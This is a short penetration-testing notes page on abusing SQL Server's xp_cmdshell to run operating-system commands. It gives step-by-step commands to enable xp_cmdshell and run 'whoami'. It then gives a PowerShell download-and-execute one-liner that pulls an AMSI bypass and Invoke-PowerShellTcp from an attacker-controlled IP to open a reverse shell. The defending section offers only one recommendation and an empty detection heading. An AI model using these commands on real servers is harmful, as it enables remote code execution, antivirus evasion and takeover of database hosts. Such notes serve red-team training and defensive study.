---
description: xp_cmdshell could be used to execute commands on the SQL Server.
---

# Executing Commands

## Attacking

### How it works

[xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) is a SQL Server functionality that is disabled by default. However it can be enabled using sp\_configure. It spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. The Windows process spawned by **** xp\_cmdshell has the same security rights as the SQL Server service account.

### Executing the attack

1. Enable xp\_cmdshell

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

![](<../../../.gitbook/assets/image (69).png>)

2\. Execute commands with xp\_cmdshell:

```
EXEC master..xp_cmdshell 'whoami'
```

![](<../../../.gitbook/assets/image (60) (1).png>)

3\. Gain a reverse shell and execute commands

```
EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/amsi.txt''); iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/Invoke-PowerShellTcp2.ps1'')"'
```

![](<../../../.gitbook/assets/image (45) (1).png>)

## Defending

### Recommendations

* Sysadmin users can enable xp\_cmdshell, so limit these users.

### Detection



## References

{% embed url="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" %}
